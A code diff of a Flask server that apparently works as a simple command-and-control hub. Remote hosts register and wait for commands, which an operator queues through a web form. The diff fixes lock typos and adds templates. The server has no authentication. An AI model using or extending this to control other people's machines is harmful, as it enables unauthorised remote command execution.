@@ -1,4 +1,4 @@
-from flask import Flask, request, send_file
+from flask import Flask, request, send_file, render_template
 import os, time
 import requests
 import threading
@@ -7,21 +7,20 @@ app = Flask(__name__)
 
 hosts = {}
 
+
 @app.route('/handshake', methods = ['POST'])
 def handshake():
   global hosts
   key = (request.remote_addr, request.form['name'])
   hosts[key] = {'lock' : threading.Lock(), 'command' : ''}
-  hosts[key]['lock'].aquire()
+  hosts[key]['lock'].acquire()
   return 'Request accepted' 
 
 @app.route('/')
 def displayHosts():
-  lines = []
-  for host in hosts:
-    lines.append(f'{host}: {hosts[host]}')
-  response = '\n'.join(lines)
-  return response
+  global hosts
+  keys = hosts.keys()
+  return render_template('index.html', keys = keys)
 
 @app.route('/download/<file>')
 def download(file):
@@ -35,13 +34,25 @@ def download(file):
 def timeout():
   global hosts
   key = (request.remote_addr, request.form['name'])
-  hosts[key]['lock'].aquire()
+  hosts[key]['lock'].acquire()
   return hosts[key]['command']
 
-@app.route('/send/<command>')
-def send(command):
+@app.route('/send', methods = ['GET'])
+def send_form():
   global hosts
-  key = (request.remote_addr, request.form['name'])
-  hosts[key]['command'] = command
-  hosts[key]['lock'].release()
-  return 'Command sent!'
+  name = request.args.get('name')
+  ip = request.args.get('ip')
+  return render_template('form.html', name = name, ip = ip)
+
+@app.route('/send', methods = ['POST'])
+def send_process  ():
+  global hosts
+  name = request.args.get('name')
+  ip = request.args.get('ip')
+  key = (ip, name)
+  hosts[key]['command'] = request.form['command']
+  if hosts[key]['lock'].locked():
+    hosts[key]['lock'].release()
+  else:
+    return 'Host offline'
+  return render_template('form.html', name = name, ip = ip)
